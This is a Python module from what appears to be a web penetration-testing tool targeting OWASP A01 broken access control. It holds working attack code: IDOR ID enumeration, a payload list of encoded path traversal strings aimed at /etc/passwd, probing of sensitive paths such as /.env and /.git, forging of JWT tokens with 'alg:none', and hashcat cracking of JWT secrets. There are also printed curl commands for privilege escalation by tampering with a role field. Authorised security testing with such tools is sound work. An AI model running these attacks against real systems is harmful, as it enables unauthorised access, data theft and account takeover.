"""
modules/broken_access_control.py
tmrswrr - A01: Broken Access Control
IDOR, path traversal, privilege escalation, forced browsing, JWT bypass
"""
import os
import re
import shutil

from config.settings import OUTPUT_DIR, SESSION, add_vuln, save_session
from utils.helpers import (
    DIM,
    NEON_CYN,
    NEON_GRN,
    NEON_YEL,
    PURE_WHITE,
    RST,
    info,
    print_banner,
    prompt,
    run_and_print,
    section,
    success,
    warn,
)
from utils.http import get_client, looks_like_notfound, notfound_signature

#: Soft-404 handling lives in utils.http so every probing module shares it.
_notfound_signature = notfound_signature
_looks_like_notfound = looks_like_notfound


def _out(name: str) -> str:
    d = str(OUTPUT_DIR)
    os.makedirs(d, exist_ok=True)
    return os.path.join(d, name)


def _target() -> str:
    url = SESSION.get("target_url", "")
    if not url:
        url = prompt("Target URL")
        SESSION["target_url"] = url
    return url


def _numeric_idor(url: str, endpoint: str, count: int = 25) -> None:
    """Walk a numeric object reference and report IDs that return real content.

    The old implementation shelled out to ffuf and then recorded a High finding
    unconditionally - it fired even when nothing was accessible. Here a hit has
    to actually look like another object: HTTP 200, a body that is not the
    application's not-found page, and content that differs from the other IDs
    (a page identical for every ID is a template, not an object).
    """
    ids = re.findall(r"\d+", endpoint)
    if not ids:
        warn("No numeric ID found in that endpoint - nothing to walk")
        return
    original = ids[0]
    template = endpoint.replace(original, "{id}", 1)
    client = get_client()

    notfound = _notfound_signature(client, url)
    seen: dict[str, list[str]] = {}
    hits = []

    info(f"Walking IDs 1-{count} in {template}")
    for i in range(1, count + 1):
        path = template.replace("{id}", str(i))
        resp = client.safe_get(url.rstrip("/") + "/" + path.lstrip("/"))
        if resp is None:
            continue
        if resp.status_code != 200 or _looks_like_notfound(resp, notfound):
            print(f"  {DIM}[{resp.status_code}]{RST}  {path}")
            continue
        digest = _body_digest(resp.text)
        seen.setdefault(digest, []).append(path)
        hits.append((path, resp, digest))
        print(f"  {NEON_GRN}[200]{RST}  {path}  ({len(resp.text)} bytes)")

    # Every ID returning the same bytes means the endpoint ignores the ID.
    distinct = {d: paths for d, paths in seen.items() if len(paths) < max(3, len(hits) // 2)}
    reportable = [(p, r) for p, r, d in hits if d in distinct and original not in p]

    if not reportable:
        info("No IDs returned distinct authorised-looking content - no IDOR evidence")
        return

    success(f"{len(reportable)} object(s) reachable besides your own ({original})")
    sample_path, sample_resp = reportable[0]
    add_vuln("IDOR - Insecure Direct Object Reference", "High", "A01:2021",
             f"{len(reportable)} object(s) other than your own returned distinct content "
             f"with the current session, e.g. {sample_path}. "
             "Verify the data belongs to another user before reporting.",
             url.rstrip("/") + "/" + sample_path.lstrip("/"),
             evidence=sample_resp.evidence, confidence="Tentative", cwe="CWE-639")
    warn("Confirm manually: the response must contain another user's data, "
         "not just a different page.")


def _body_digest(text: str) -> str:
    import hashlib
    return hashlib.sha1(text.encode("utf-8", errors="replace")).hexdigest()


def idor_test():
    section("IDOR - Insecure Direct Object Reference")
    url = _target()
    info("IDOR: Testing predictable object references (user IDs, file IDs, etc.)")

    endpoint = prompt("Endpoint with ID param (e.g. /api/user/1 or /profile?id=1)")
    param_type = prompt("ID type: [1] numeric  [2] UUID  [3] username") or "1"

    if param_type == "1":
        _numeric_idor(url, endpoint)

    elif param_type == "2":
        info("UUID IDOR - requires known UUIDs or UUID prediction")
        print(f"""
  {NEON_CYN}UUID IDOR manual approach:{RST}
    1. Register two accounts, note both UUIDs
    2. Access account-B resources with account-A session:
       curl -s -H "Authorization: Bearer TOKEN_A" {url}/api/user/UUID_B/profile
    3. Check if cross-account data is returned (IDOR confirmed)
""")

    info("Privilege escalation via parameter tampering:")
    print(f"""
  {NEON_CYN}Test role parameter manipulation:{RST}
    curl -s -X PUT {url}/api/user/profile \\
      -H "Content-Type: application/json" \\
      -d '{{"role":"admin","userId":1}}'
""")


def path_traversal():
    section("PATH TRAVERSAL - Directory Traversal")
    url = _target()

    payloads = [
        "../../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "/etc/passwd",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
    ]

    param = prompt("Parameter to test (e.g. file, path, page, include, dir)")
    method = prompt("HTTP method [1] GET  [2] POST") or "1"

    info(f"Testing path traversal via parameter: {param}")
    print()

    client = get_client()
    for payload in payloads:
        if method == "1":
            resp = client.safe_get(url, params={param: payload})
        else:
            try:
                resp = client.post(url, data={param: payload})
            except Exception:
                resp = None
        if resp is None:
            print(f"  {DIM}[!] {payload} (request failed){RST}")
            continue

        body = resp.text
        marker = next((m for m in ("root:x:", "daemon:", "[fonts]", "[extensions]") if m in body), None)
        if marker:
            success(f"PATH TRAVERSAL CONFIRMED with payload: {payload}")
            add_vuln("Path Traversal", "Critical", "A01:2021",
                     f"Payload {payload} returned OS file contents (matched '{marker}')",
                     resp.evidence.url, evidence=resp.evidence,
                     confidence="Confirmed", cwe="CWE-22")
            print(f"{NEON_GRN}{body[:500]}{RST}")
            break
        else:
            print(f"  {DIM}[-] {payload}{RST}")

    if shutil.which("dotdotpwn"):
        if prompt("Run dotdotpwn? [y/N]").lower() == "y":
            out = _out("dotdotpwn.txt")
            run_and_print(f"dotdotpwn -m http -h {url} -f /etc/passwd -o {out}", timeout=300)


def forced_browsing():
    section("FORCED BROWSING - Admin & Sensitive Paths")
    url = _target()

    admin_paths = [
        "/admin", "/admin/", "/administrator", "/wp-admin", "/wp-login.php",
        "/phpmyadmin", "/phpMyAdmin", "/pma", "/panel", "/cpanel",
        "/manager", "/manage", "/management", "/dashboard",
        "/backend", "/backoffice", "/controlpanel", "/console",
        "/.git", "/.git/config", "/.env", "/.htaccess", "/.htpasswd",
        "/config.php", "/config.yml", "/config.json", "/settings.php",
        "/backup", "/backup.zip", "/backup.tar.gz", "/db.sql",
        "/api/v1/users", "/api/admin", "/api/debug",
        "/actuator", "/actuator/health", "/actuator/env", "/actuator/beans",
        "/swagger", "/swagger-ui", "/swagger.json", "/api-docs",
        "/graphql", "/graphiql", "/.well-known",
        "/server-status", "/server-info", "/nginx_status",
        "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
        "/trace", "/debug", "/test", "/temp",
    ]

    client = get_client()
    found = []

    info(f"Testing {len(admin_paths)} sensitive paths against {url}")
    # An app that answers 200 with a 'not found' page would otherwise make every
    # path look exposed, so establish what a miss looks like first.
    notfound = _notfound_signature(client, url)
    if notfound and notfound[0] == 200:
        warn(f"Target returns HTTP 200 for missing paths ({notfound[1]} bytes) - soft-404 filtering on")
    print()

    for path in admin_paths:
        resp = client.safe_get(url.rstrip("/") + path)
        if resp is None:
            print(f"  {DIM}[!]{RST}  {path} (request failed)")
            continue
        code = resp.status_code
        if code in (200, 301, 302, 403) and not _looks_like_notfound(resp, notfound):
            color = NEON_GRN if code == 200 else NEON_YEL
            print(f"  {color}[{code}]{RST}  {url}{path}")
            found.append((path, code))
            if code == 200:
                # /.git, /.env and friends leak source or credentials outright;
                # an admin panel that merely exists is a lesser issue.
                critical_path = any(path.startswith(p) for p in
                                    ("/.git", "/.env", "/.htpasswd", "/backup", "/db.sql",
                                     "/config", "/actuator/env", "/settings.php"))
                add_vuln("Exposed Sensitive Path", "Critical" if critical_path else "Medium",
                         "A01:2021",
                         f"{path} is reachable without authorisation (HTTP {code}, "
                         f"{len(resp.text)} bytes)",
                         url.rstrip("/") + path, evidence=resp.evidence,
                         confidence="Confirmed", cwe="CWE-200")
        else:
            print(f"  {DIM}[{code}]{RST}  {path}")

    if found:
        success(f"Found {len(found)} accessible sensitive paths!")
    else:
        info("No obvious sensitive paths found")


def jwt_analysis():
    section("JWT ATTACK SURFACE")
    print(f"""
  {NEON_CYN}[1]{RST} Decode & analyze JWT token
  {NEON_CYN}[2]{RST} Test algorithm confusion (HS256/RS256)
  {NEON_CYN}[3]{RST} Test none algorithm bypass
  {NEON_CYN}[4]{RST} Crack JWT secret (hashcat)
  {NEON_GRN}[0]{RST} Back
""")
    c = prompt("Choice")

    if c == "1":
        token = prompt("Paste JWT token")
        if "." in token:
            parts = token.split(".")
            if len(parts) >= 2:
                import base64
                def b64d(s):
                    s += "=" * (4 - len(s) % 4)
                    try:
                        return base64.b64decode(s).decode("utf-8", errors="replace")
                    except Exception:
                        return "?"
                print(f"\n  {NEON_CYN}Header:{RST}  {b64d(parts[0])}")
                print(f"  {NEON_CYN}Payload:{RST} {b64d(parts[1])}")
                print(f"  {NEON_YEL}Signature:{RST} {parts[2][:40]}...")

    elif c == "2":
        info("Algorithm confusion attack (RS256 → HS256):")
        print(f"""
  {NEON_CYN}Using jwt_tool:{RST}
    pip install jwt_tool
    jwt_tool TOKEN -X a -pk public_key.pem

  {NEON_CYN}Manual steps:{RST}
    1. Get the server's public RSA key from /jwks.json or /.well-known/openid-configuration
    2. Sign a modified JWT using that public key as HS256 secret
    3. Server verifies using public key as HMAC secret → bypass!
""")

    elif c == "3":
        token = prompt("Paste JWT token to create none-bypass version")
        if "." in token:
            import base64
            parts = token.split(".")
            header = '{"alg":"none","typ":"JWT"}'
            encoded_header = base64.b64encode(header.encode()).decode().rstrip("=")
            forged = f"{encoded_header}.{parts[1]}."
            print(f"\n  {NEON_GRN}None-algorithm bypass token:{RST}")
            print(f"  {forged}")
            info("Send this token in Authorization header - some libraries accept it")

    elif c == "4":
        token = prompt("Paste JWT token")
        if shutil.which("hashcat"):
            tf = _out("jwt_token.txt")
            with open(tf, "w") as f:
                f.write(token)
            wordlist = "/usr/share/wordlists/rockyou.txt"
            run_and_print(f"hashcat -a 0 -m 16500 {tf} {wordlist}", timeout=300)
        else:
            warn("hashcat not found. Install: apt install hashcat")


def run():
    print_banner("BROKEN ACCESS CONTROL", "A01:2021 - OWASP Top 10 #1")
    while True:
        url = SESSION.get("target_url", "-")
        print(f"""
  {NEON_GRN}Target:{RST} {PURE_WHITE}{url}{RST}

  {NEON_CYN}[1]{RST} IDOR Testing (Insecure Direct Object Reference)
  {NEON_CYN}[2]{RST} Path Traversal / Directory Traversal
  {NEON_CYN}[3]{RST} Forced Browsing (Admin/Sensitive Paths)
  {NEON_CYN}[4]{RST} JWT Analysis & Bypass Attacks
  {NEON_GRN}[0]{RST} Back to main menu
""")
        c = prompt("Choice")
        if c == "0":
            break
        elif c == "1":
            idor_test()
        elif c == "2":
            path_traversal()
        elif c == "3":
            forced_browsing()
        elif c == "4":
            jwt_analysis()
        save_session()
